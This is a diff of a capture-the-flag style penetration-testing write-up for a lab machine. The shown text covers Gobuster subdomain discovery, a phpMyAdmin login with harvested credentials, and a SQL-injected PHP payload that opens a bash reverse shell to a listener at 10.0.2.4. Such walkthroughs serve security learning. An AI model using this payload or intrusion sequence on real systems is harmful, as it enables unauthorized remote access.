@@ -46,7 +46,7 @@ Indeed, the file contains user credentials that may prove useful later.
 
 ## Exploiting
 
-UUsing Gobuster with the vhost option allows the discovery of subdomains. With the dictionary used (/dirbuster/wordlists/directory-list-2.3-medium.txt), a single subdomain was found: datasafe.votenow.local.
+Using Gobuster with the vhost option allows the discovery of subdomains. With the dictionary used (/dirbuster/wordlists/directory-list-2.3-medium.txt), a single subdomain was found: datasafe.votenow.local.
 
 The subdomain's web page features an access panel to "phpMyAdmin." By entering the previously obtained credentials, it is possible to log in and access a SQL database containing the hash of an admin user's password.
 
@@ -75,7 +75,9 @@ The URL must have the following format:
 where {cookieValue} is the current session's cookie value.
 
 By listening with a netcat listener on port 443 and injecting a SQL query like:
+
 `select '<?php system("bash -i >& /dev/tcp/10.0.2.4/443 0>&1");?>'`
+
 and structuring the URL as shown, a reverse shell is obtained on the presidential machine.
 
 ![Exploitation of the vulnerability](images/sql_vuln.png)
